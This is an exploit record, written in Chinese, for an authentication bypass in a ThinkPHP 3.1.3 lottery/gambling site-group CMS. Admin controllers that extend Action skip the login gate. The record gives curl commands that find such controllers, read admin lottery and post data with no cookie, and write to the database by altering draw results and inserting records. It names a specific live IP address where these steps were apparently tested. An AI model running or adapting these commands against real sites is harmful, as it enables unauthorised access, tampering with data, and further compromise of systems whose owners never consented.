# SomCNS/ThinkPHP3.1.3 站群 166 站：Admin/Autoart 控制器脱队（extends Action）→ 零凭证读开奖/文章数据 + POST editkjer 写库

- **code**: somcns-thinkphp3.1.3-站群-166-站-admin-autoart-控制器脱队-extends-ac
- **kind**: exp
- **category**: auth-bypass
- **component**: SomCNS 六合彩/聚宝阁站群 CMS（ThinkPHP 3.1.3）
- **severity**: critical
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-29 在 45.151.135.166:443 零 Cookie、curl -k --noproxy '*' 直连实测：① GET /index.php?g=Admin&m=Autoart&a=kjer → 200/88964B「开奖管理」，101 行记录（ID 6070~6101、期号 2026291~2026301）；对照同组 User/Main/System/Admin/Article/Payorder/Block/Daikuan → 全部 302 Location: /index.php?g=Admin&m=Index&a=login；② GET a=indexam → 200/64084B 帖子管理（含文章 ID/作者/单价/销量）、a=catlist → 200/42306B；③ POST a=editkjer&id=6101 把 topenCode 07→44 回显「编辑成功!」，回读 kjer 该行变 44，再改回 07；④ POST a=editkjer&id=0 新插记录，列表「共 N 条记录」224→225→226；⑤ POST a=article_save ids=8_54 → 200/1B body "1"；⑥ 根因：GET /App/Lib/Action/Admin/AutoartAction.class.php/ → Fatal error 回显 /www/wwwroot/kkjjer_com/App/Lib/Action/Admin/AutoartAction.class.php（extends Action，不走 CommonAction::_initialize 的 Host/登录闸门）。
- **path**: pocs/somcns-thinkphp3.1.3-站群-166-站-admin-autoart-控制器脱队-extends-ac/poc.txt
- **tags**: thinkphp3.1.3,站群,somcns,autoart,extends-action,未授权访问,未授权写库,kjer
- **created_at**: 2026-10-28T18:59:19.556Z
- **engine**: 45.151.135.166 (https://45.151.135.166，docroot=/www/wwwroot/kkjjer_com)

## 描述

SomCNS TP3.1.3 站群后台鉴权集中在 CommonAction::_initialize，但 Admin 组里写成 extends Action 的控制器（Autoart、Wechat）整段跳过闸门，零 Cookie 即可读写后台业务数据。判据：同组其它控制器 302 到登录页，而该控制器 200 出业务表格。

## 用法

```
1) 找脱队控制器（文件存在性预言机）：
curl -k --noproxy '*' "https://TARGET/App/Lib/Action/Admin/AutoartAction.class.php/x"
# 回显 Class 'CommonAction' not found = 走闸门；Class 'Action' not found = 脱队 = 目标
2) 零凭证读：
curl -k --noproxy '*' "https://TARGET/index.php?g=Admin&m=Autoart&a=kjer"
curl -k --noproxy '*' "https://TARGET/index.php?g=Admin&m=Autoart&a=indexam"
3) 零凭证写（改开奖记录，先记原值再回滚）：
curl -k --noproxy '*' -X POST "https://TARGET/index.php?g=Admin&m=Autoart&a=editkjer&id=<ID>" \
  -d "expect=<期号>&openTime=<时间>&type=8&openCode=01,02,03,04,05,06,07&zodiac=马&wave=red&topenCode=44&tzodiac=马&twave=red"
# 回显 <p class="success">编辑成功!</p>，回读 a=kjer 确认字段已变
4) 对照：m=User|Main|System|Admin|Article|Payorder|Block|Daikuan&a=index 全 302。
```

## 正文

```
## 现象
- `GET /index.php?g=Admin&m=Admin&a=kjer` 类请求中，`m=Autoart` 零 Cookie 返回 200 后台框架页 + 真实数据；同组 `m=User/Main/System/Admin/Article/Payorder/Block/Daikuan` 全部 302 → `/index.php?g=Admin&m=Index&a=login`。
- Autoart 可用 action：kjer / kjer1 / kjerhk / kjer_new / index / indexam / catlist / editkjer / del / add / addcat / clearcache / logout。
- 写点：`POST a=editkjer&id=<id>` 回显「编辑成功!」，页面 trace 显示 `1 queries 1 writes`；`POST a=article_save`（ids=8_54）返回生成条数。
- 读点：kjer 开奖记录（期号/码数/特码/生肖/波色）、indexam 帖子（作者/单价/销量）。

## 根因
`/App/Lib/Action/Admin/AutoartAction.class.php` 里 `class AutoartAction extends Action`，未继承 `CommonAction`，因此 `CommonAction::_initialize()` 的登录/Host 白名单校验整段被跳过。同站 Wechat 控制器同型。

## 复现三件套
1. `curl -k --noproxy '*' "https://45.151.135.166/index.php?g=Admin&m=Autoart&a=kjer"` → 200/88964B，`<title>开奖管理 - 管理系统</title>`
2. `curl -k --noproxy '*' -X POST "https://45.151.135.166/index.php?g=Admin&m=Autoart&a=editkjer&id=6101" -d "expect=9996048&openTime=2026-10-29 02:30:00&type=8&openCode=01,02,03,04,05,06,07&zodiac=马&wave=red&topenCode=44&tzodiac=马&twave=red"` → 200「编辑成功!」，回读 topenCode=44
3. 复原：同请求 `topenCode=07`，读回 07（零副作用验证/回滚）

## 证伪条件
若带/不带 Cookie 的 kjer 响应完全一致且不含业务数据，或同组全部 Admin 控制器都 200，则判断不成立。实测两者均不成立。

## 影响
零凭证读写博彩站核心开奖数据（可篡改开奖结果），并可作为读取 App/Conf/config.db.php 等配置、进一步拿后台凭据/RCE 的立足点。
```
